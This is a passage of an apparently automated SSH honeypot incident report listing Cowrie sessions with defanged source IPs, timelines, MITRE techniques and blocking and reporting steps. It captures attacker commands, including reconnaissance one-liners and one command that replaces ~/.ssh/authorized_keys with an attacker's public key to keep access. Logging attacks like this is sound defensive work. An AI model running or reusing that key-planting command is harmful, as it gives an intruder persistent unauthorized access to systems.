| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:24:57` | `cowrie.session.connect` |
| `2026-07-12 14:24:57` | `cowrie.client.version` |
| `2026-07-12 14:24:57` | `cowrie.client.kex` |
| `2026-07-12 14:24:59` | `cowrie.login.success` |
| `2026-07-12 14:25:01` | `cowrie.session.params` |
| `2026-07-12 14:25:01` | `cowrie.command.input` |
| `2026-07-12 14:25:01` | `cowrie.command.input` |
| `2026-07-12 14:25:01` | `cowrie.command.input` |
| `2026-07-12 14:25:01` | `cowrie.command.input` |
| `2026-07-12 14:25:01` | `cowrie.command.input` |
| `2026-07-12 14:25:01` | `cowrie.command.success` |
| `2026-07-12 14:25:01` | `cowrie.command.input` |
| `2026-07-12 14:25:01` | `cowrie.command.input` |
| `2026-07-12 14:25:01` | `cowrie.command.input` |
| `2026-07-12 14:25:01` | `cowrie.command.input` |
| `2026-07-12 14:25:01` | `cowrie.log.closed` |
| `2026-07-12 14:25:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-599cd73fee69

| Field | Detail |
|---|---|
| **Source IP** | `41.204.82[.]238` |
| **First Seen** | 2026-07-12 14:26 |
| **Last Seen** | 2026-07-12 14:27 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:26:55` | `cowrie.session.connect` |
| `2026-07-12 14:26:55` | `cowrie.client.version` |
| `2026-07-12 14:26:55` | `cowrie.client.kex` |
| `2026-07-12 14:26:56` | `cowrie.login.success` |
| `2026-07-12 14:26:57` | `cowrie.session.params` |
| `2026-07-12 14:26:57` | `cowrie.command.input` |
| `2026-07-12 14:26:57` | `cowrie.command.failed` |
| `2026-07-12 14:26:57` | `cowrie.log.closed` |
| `2026-07-12 14:26:58` | `cowrie.session.params` |
| `2026-07-12 14:26:58` | `cowrie.command.input` |
| `2026-07-12 14:26:58` | `cowrie.session.file_download` |
| `2026-07-12 14:26:58` | `cowrie.log.closed` |
| `2026-07-12 14:27:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.204.82[.]238` to AbuseIPDB if not already reported
- [ ] Block `41.204.82[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfc572d3f6c5

| Field | Detail |
|---|---|
| **Source IP** | `41.204.82[.]238` |
| **First Seen** | 2026-07-12 14:26 |
| **Last Seen** | 2026-07-12 14:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:26:58` | `cowrie.session.connect` |
| `2026-07-12 14:26:58` | `cowrie.client.version` |
| `2026-07-12 14:26:58` | `cowrie.client.kex` |
| `2026-07-12 14:26:59` | `cowrie.login.success` |
| `2026-07-12 14:26:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.204.82[.]238` to AbuseIPDB if not already reported
- [ ] Block `41.204.82[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8c63be43bd6

| Field | Detail |
|---|---|
| **Source IP** | `41.204.82[.]238` |
| **First Seen** | 2026-07-12 14:26 |
| **Last Seen** | 2026-07-12 14:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:26:59` | `cowrie.session.connect` |
| `2026-07-12 14:26:59` | `cowrie.client.version` |
| `2026-07-12 14:26:59` | `cowrie.client.kex` |
| `2026-07-12 14:27:00` | `cowrie.login.success` |
| `2026-07-12 14:27:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.204.82[.]238` to AbuseIPDB if not already reported
- [ ] Block `41.204.82[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecd853dd9d01

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-12 14:27 |
| **Last Seen** | 2026-07-12 14:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:27:26` | `cowrie.session.connect` |
| `2026-07-12 14:27:26` | `cowrie.client.version` |
| `2026-07-12 14:27:26` | `cowrie.client.kex` |
| `2026-07-12 14:27:28` | `cowrie.login.success` |
| `2026-07-12 14:27:30` | `cowrie.session.params` |
| `2026-07-12 14:27:30` | `cowrie.command.input` |
| `2026-07-12 14:27:30` | `cowrie.command.input` |
| `2026-07-12 14:27:30` | `cowrie.command.input` |
| `2026-07-12 14:27:30` | `cowrie.command.input` |
| `2026-07-12 14:27:30` | `cowrie.command.input` |
| `2026-07-12 14:27:30` | `cowrie.command.success` |
| `2026-07-12 14:27:30` | `cowrie.command.input` |
| `2026-07-12 14:27:30` | `cowrie.command.input` |
| `2026-07-12 14:27:30` | `cowrie.command.input` |
| `2026-07-12 14:27:30` | `cowrie.command.input` |
| `2026-07-12 14:27:30` | `cowrie.log.closed` |
| `2026-07-12 14:27:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f02c5a5b3ac

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-12 14:29 |
| **Last Seen** | 2026-07-12 14:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:29:16` | `cowrie.session.connect` |
| `2026-07-12 14:29:16` | `cowrie.client.version` |
| `2026-07-12 14:29:16` | `cowrie.client.kex` |
| `2026-07-12 14:29:16` | `cowrie.login.success` |
| `2026-07-12 14:29:17` | `cowrie.session.params` |
| `2026-07-12 14:29:17` | `cowrie.command.input` |
| `2026-07-12 14:29:19` | `cowrie.log.closed` |
| `2026-07-12 14:29:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1edcbbd72460

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-12 14:29 |
| **Last Seen** | 2026-07-12 14:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:29:57` | `cowrie.session.connect` |
| `2026-07-12 14:29:57` | `cowrie.client.version` |
| `2026-07-12 14:29:57` | `cowrie.client.kex` |
| `2026-07-12 14:29:59` | `cowrie.login.success` |
| `2026-07-12 14:30:00` | `cowrie.session.params` |
| `2026-07-12 14:30:00` | `cowrie.command.input` |
| `2026-07-12 14:30:00` | `cowrie.command.input` |
| `2026-07-12 14:30:00` | `cowrie.command.input` |
| `2026-07-12 14:30:00` | `cowrie.command.input` |
| `2026-07-12 14:30:00` | `cowrie.command.input` |
| `2026-07-12 14:30:00` | `cowrie.command.success` |
| `2026-07-12 14:30:00` | `cowrie.command.input` |
| `2026-07-12 14:30:00` | `cowrie.command.input` |
| `2026-07-12 14:30:00` | `cowrie.command.input` |
| `2026-07-12 14:30:00` | `cowrie.command.input` |
| `2026-07-12 14:30:01` | `cowrie.log.closed` |
| `2026-07-12 14:30:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c81ef2c5f3c5

| Field | Detail |
|---|---|
| **Source IP** | `196.190.180[.]18` |
| **First Seen** | 2026-07-12 14:30 |
| **Last Seen** | 2026-07-12 14:30 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:30:22` | `cowrie.session.connect` |
| `2026-07-12 14:30:22` | `cowrie.client.version` |
| `2026-07-12 14:30:22` | `cowrie.client.kex` |
| `2026-07-12 14:30:24` | `cowrie.login.success` |
| `2026-07-12 14:30:24` | `cowrie.direct-tcpip.request` |
| `2026-07-12 14:30:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.190.180[.]18` to AbuseIPDB if not already reported
- [ ] Block `196.190.180[.]18` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c03cb50ba79a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-12 14:32 |
| **Last Seen** | 2026-07-12 14:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:32:35` | `cowrie.session.connect` |
| `2026-07-12 14:32:36` | `cowrie.client.version` |
| `2026-07-12 14:32:36` | `cowrie.client.kex` |
| `2026-07-12 14:32:37` | `cowrie.login.success` |
| `2026-07-12 14:32:39` | `cowrie.session.params` |
| `2026-07-12 14:32:39` | `cowrie.command.input` |
| `2026-07-12 14:32:39` | `cowrie.command.input` |
| `2026-07-12 14:32:39` | `cowrie.command.input` |
| `2026-07-12 14:32:39` | `cowrie.command.input` |
| `2026-07-12 14:32:39` | `cowrie.command.input` |
| `2026-07-12 14:32:39` | `cowrie.command.success` |
| `2026-07-12 14:32:39` | `cowrie.command.input` |
| `2026-07-12 14:32:39` | `cowrie.command.input` |
| `2026-07-12 14:32:39` | `cowrie.command.input` |
| `2026-07-12 14:32:39` | `cowrie.command.input` |
| `2026-07-12 14:32:39` | `cowrie.log.closed` |
| `2026-07-12 14:32:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcfba9bd63ca

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]53` |
| **First Seen** | 2026-07-12 14:34 |
| **Last Seen** | 2026-07-12 14:34 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:34:03` | `cowrie.session.connect` |
| `2026-07-12 14:34:04` | `cowrie.client.version` |
| `2026-07-12 14:34:04` | `cowrie.client.kex` |
| `2026-07-12 14:34:06` | `cowrie.login.success` |
| `2026-07-12 14:34:07` | `cowrie.direct-tcpip.request` |
| `2026-07-12 14:34:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]53` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-293d25d36e28

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-12 14:35 |
| **Last Seen** | 2026-07-12 14:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:35:16` | `cowrie.session.connect` |
| `2026-07-12 14:35:16` | `cowrie.client.version` |
| `2026-07-12 14:35:16` | `cowrie.client.kex` |
| `2026-07-12 14:35:17` | `cowrie.login.success` |
| `2026-07-12 14:35:18` | `cowrie.session.params` |
| `2026-07-12 14:35:18` | `cowrie.command.input` |
| `2026-07-12 14:35:18` | `cowrie.command.input` |
| `2026-07-12 14:35:18` | `cowrie.command.input` |
| `2026-07-12 14:35:18` | `cowrie.command.input` |
| `2026-07-12 14:35:18` | `cowrie.command.input` |
| `2026-07-12 14:35:18` | `cowrie.command.success` |
| `2026-07-12 14:35:18` | `cowrie.command.input` |
| `2026-07-12 14:35:18` | `cowrie.command.input` |
| `2026-07-12 14:35:18` | `cowrie.command.input` |
| `2026-07-12 14:35:18` | `cowrie.command.input` |
| `2026-07-12 14:35:19` | `cowrie.log.closed` |
| `2026-07-12 14:35:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5bb978a4203

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]58` |
| **First Seen** | 2026-07-12 14:35 |
| **Last Seen** | 2026-07-12 14:35 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:35:46` | `cowrie.session.connect` |
| `2026-07-12 14:35:47` | `cowrie.client.version` |
| `2026-07-12 14:35:47` | `cowrie.client.kex` |
| `2026-07-12 14:35:48` | `cowrie.login.success` |
| `2026-07-12 14:35:49` | `cowrie.direct-tcpip.request` |
| `2026-07-12 14:35:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]58` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc69862e2060

| Field | Detail |
|---|---|
| **Source IP** | `49.124.149[.]211` |
| **First Seen** | 2026-07-12 14:35 |
| **Last Seen** | 2026-07-12 14:36 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:35:59` | `cowrie.session.connect` |
| `2026-07-12 14:36:00` | `cowrie.client.version` |
| `2026-07-12 14:36:00` | `cowrie.client.kex` |
| `2026-07-12 14:36:02` | `cowrie.login.success` |
| `2026-07-12 14:36:02` | `cowrie.direct-tcpip.request` |
| `2026-07-12 14:36:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.149[.]211` to AbuseIPDB if not already reported
- [ ] Block `49.124.149[.]211` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30e4817e7aea

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-12 14:37 |
| **Last Seen** | 2026-07-12 14:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:37:58` | `cowrie.session.connect` |
| `2026-07-12 14:37:58` | `cowrie.client.version` |
| `2026-07-12 14:37:58` | `cowrie.client.kex` |
| `2026-07-12 14:38:00` | `cowrie.login.success` |
| `2026-07-12 14:38:01` | `cowrie.session.params` |
| `2026-07-12 14:38:01` | `cowrie.command.input` |
| `2026-07-12 14:38:01` | `cowrie.command.input` |
| `2026-07-12 14:38:01` | `cowrie.command.input` |
| `2026-07-12 14:38:01` | `cowrie.command.input` |
| `2026-07-12 14:38:01` | `cowrie.command.input` |
| `2026-07-12 14:38:01` | `cowrie.command.success` |
| `2026-07-12 14:38:01` | `cowrie.command.input` |
| `2026-07-12 14:38:01` | `cowrie.command.input` |
| `2026-07-12 14:38:01` | `cowrie.command.input` |
| `2026-07-12 14:38:01` | `cowrie.command.input` |
| `2026-07-12 14:38:02` | `cowrie.log.closed` |
| `2026-07-12 14:38:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea8b659e4348

| Field | Detail |
|---|---|
| **Source IP** | `213.101.138[.]172` |
| **First Seen** | 2026-07-12 14:39 |
| **Last Seen** | 2026-07-12 14:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:39:17` | `cowrie.session.connect` |
| `2026-07-12 14:39:18` | `cowrie.client.version` |
| `2026-07-12 14:39:18` | `cowrie.client.kex` |
| `2026-07-12 14:39:19` | `cowrie.login.success` |
| `2026-07-12 14:39:19` | `cowrie.direct-tcpip.request` |
| `2026-07-12 14:39:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.101.138[.]172` to AbuseIPDB if not already reported
- [ ] Block `213.101.138[.]172` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b640d5f13fa1

| Field | Detail |
|---|---|
| **Source IP** | `65.20.211[.]96` |
| **First Seen** | 2026-07-12 14:39 |
| **Last Seen** | 2026-07-12 14:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:39:30` | `cowrie.session.connect` |
| `2026-07-12 14:39:30` | `cowrie.client.version` |
| `2026-07-12 14:39:30` | `cowrie.client.kex` |
| `2026-07-12 14:39:31` | `cowrie.login.success` |
| `2026-07-12 14:39:32` | `cowrie.direct-tcpip.request` |
| `2026-07-12 14:39:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.211[.]96` to AbuseIPDB if not already reported
- [ ] Block `65.20.211[.]96` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24fc2414b988

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-12 14:40 |
| **Last Seen** | 2026-07-12 14:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:40:39` | `cowrie.session.connect` |
| `2026-07-12 14:40:39` | `cowrie.client.version` |
| `2026-07-12 14:40:39` | `cowrie.client.kex` |
| `2026-07-12 14:40:40` | `cowrie.login.success` |
| `2026-07-12 14:40:41` | `cowrie.session.params` |
| `2026-07-12 14:40:41` | `cowrie.command.input` |
| `2026-07-12 14:40:41` | `cowrie.command.input` |
| `2026-07-12 14:40:41` | `cowrie.command.input` |
| `2026-07-12 14:40:41` | `cowrie.command.input` |
| `2026-07-12 14:40:42` | `cowrie.command.input` |
| `2026-07-12 14:40:42` | `cowrie.command.success` |
| `2026-07-12 14:40:42` | `cowrie.command.input` |
| `2026-07-12 14:40:42` | `cowrie.command.input` |
| `2026-07-12 14:40:42` | `cowrie.command.input` |
| `2026-07-12 14:40:42` | `cowrie.command.input` |
| `2026-07-12 14:40:42` | `cowrie.log.closed` |
| `2026-07-12 14:40:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2885a47768d4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-12 14:43 |
| **Last Seen** | 2026-07-12 14:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
